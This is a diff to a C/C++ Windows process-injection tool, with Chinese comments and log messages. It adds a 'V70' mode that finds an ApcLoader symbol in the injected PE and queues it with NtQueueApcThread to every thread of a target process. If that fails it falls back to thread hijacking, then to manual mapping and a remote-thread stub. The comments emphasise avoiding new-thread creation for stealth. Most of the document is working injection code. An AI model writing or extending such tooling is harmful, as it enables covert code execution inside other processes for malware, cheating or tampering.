@@ -873,6 +873,7 @@ static bool HijackRun(HANDLE proc, DWORD pid, ULONGLONG base, ULONGLONG entry)
     Sleep(150);
     DWORD oldp = 0;
     VirtualProtectEx(proc, (void*)base, 0x1000, PAGE_READONLY, &oldp);
+    printf("[*] 劫持执行成功 (tid %lu)\n", tid);
     CloseHandle(th);
     return true;
 }
@@ -908,6 +909,78 @@ static void CleanupSectionMap(HANDLE proc, ULONGLONG base)
         }
     }
     if (pNtUnmap) pNtUnmap(proc, (void*)base);
+}
+
+// 在 COFF 符号表中找符号的 RVA (函数地址); 找不到返回 0
+// 注意: MinGW COFF 里 C 符号带下划线前缀 (_ApcLoader), 两者都尝试。
+static DWORD FindSymRva(const BYTE* imgFile, size_t imgSize, const char* target)
+{
+    char alt[64];
+    snprintf(alt, sizeof(alt), "_%s", target);
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)imgFile;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
+    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(imgFile + dos->e_lfanew);
+    DWORD symOff = nt->FileHeader.PointerToSymbolTable;
+    DWORD symNum = nt->FileHeader.NumberOfSymbols;
+    if (!symOff || !symNum) return 0;
+    if (symOff + (size_t)symNum * 18 + 4 > imgSize) return 0;
+    const CoffSym* syms = (const CoffSym*)(imgFile + symOff);
+    const char* strtab = (const char*)(imgFile + symOff + (size_t)symNum * 18);
+    DWORD found = 0;
+    for (DWORD i = 0; i < symNum; i++) {
+        const CoffSym* s = &syms[i];
+        const char* nm = CoffName(s, strtab);
+        if (strcmp(nm, target) == 0 || strcmp(nm, alt) == 0) {
+            // 函数段符号: value 是节内偏移, 需加上节区 VirtualAddress
+            if (s->section > 0) {
+                IMAGE_SECTION_HEADER* secs = IMAGE_FIRST_SECTION(nt);
+                int sn = s->section - 1;
+                if (sn < nt->FileHeader.NumberOfSections)
+                    found = s->value + secs[sn].VirtualAddress;
+            }
+        }
+        i += s->naux;
+    }
+    return found;
+}
+
+//--------------------------------------------------------------------------
+// V70: APC 执行 (不创建新线程)。把 ApcLoader 投递到目标全部线程的 APC
+// 队列 —— 任意线程进入 alertable 等待即触发; 加载器自修 IAT 后跑 DllMain
+// (g_attached 幂等, 多线程同时触发安全)。
+//--------------------------------------------------------------------------
+typedef NTSTATUS (NTAPI* NtQueueApcThread_t)(HANDLE, PVOID, PVOID, PVOID);
+
+static bool ApcRun(HANDLE proc, DWORD pid, ULONGLONG base, DWORD apcRva)
+{
+    auto pNtQueue = (NtQueueApcThread_t)(void*)GetProcAddress(
+        GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");
+    if (!pNtQueue) return false;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    int queued = 0;
+    if (snap != INVALID_HANDLE_VALUE) {
+        THREADENTRY32 te;
+        te.dwSize = sizeof(te);
+        if (Thread32First(snap, &te)) {
+            do {
+                if (te.th32OwnerProcessID != pid) continue;
+                HANDLE th = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
+                if (th) {
+                    pNtQueue(th, (void*)(base + apcRva), (void*)base, NULL);
+                    CloseHandle(th);
+                    queued++;
+                }
+            } while (Thread32Next(snap, &te));
+        }
+        CloseHandle(snap);
+    }
+    if (!queued) return false;
+    for (int i = 0; i < 100; i++) {
+        Sleep(50);
+        if (AlreadyInjected(pid)) { printf("[*] APC 执行成功\n"); return true; }
+    }
+    printf("[d] APC 超时 (queued=%d)\n", queued);
+    return false;
 }
 
 //--------------------------------------------------------------------------
@@ -988,24 +1061,25 @@ int main(int argc, char** argv)
         ok = ManualMap(proc, img, imgSize, NULL, NULL, true);
     } else {
         ULONGLONG base = 0, entry = 0;
-        printf("[*] V68 镜像节区映射注入 (MEM_IMAGE + PEB 注册 + 线程劫持)...\n");
+        DWORD apcRva = FindSymRva(img, imgSize, "ApcLoader");
+        printf("[*] V70 注入: 镜像节区映射 + APC 执行 (apcRva=0x%lX)...\n", apcRva);
         if (SectionMapInject(proc, img, imgSize, &base, &entry)) {
-            ok = HijackRun(proc, pid, base, entry);
+            if (apcRva) ok = ApcRun(proc, pid, base, apcRva);
+            if (!ok) ok = HijackRun(proc, pid, base, entry);
             if (!ok) {
-                printf("[*] 劫持执行失败, 清理并回退...\n");
+                printf("[*] APC/劫持均失败, 清理并回退...\n");
                 CleanupSectionMap(proc, base);
             }
         } else {
-            printf("[*] 节区映射不可用, 回退手动映射 + 线程劫持...\n");
+            printf("[*] 节区映射不可用, 回退手动映射 + APC...\n");
         }
         if (!ok) {
-            // 回退: 手动映射 (匿名内存) + 线程劫持 (仍不创建新线程)
             base = entry = 0;
             if (ManualMap(proc, img, imgSize, &base, &entry, false)) {
-                ok = HijackRun(proc, pid, base, entry);
+                if (apcRva) ok = ApcRun(proc, pid, base, apcRva);
+                if (!ok) ok = HijackRun(proc, pid, base, entry);
                 if (!ok) {
-                    // 劫持不可用: 最后手段, 用传统远程线程跑 DllMain
-                    // (映像已就位, 直接再执行一次入口; g_attached 幂等防重)
+                    // 最后手段: 传统远程线程跑入口 (g_attached 幂等防重)
                     BYTE stub2[64];
                     size_t sn2 = 0;
                     stub2[sn2++] = 0x48; stub2[sn2++] = 0xB9;
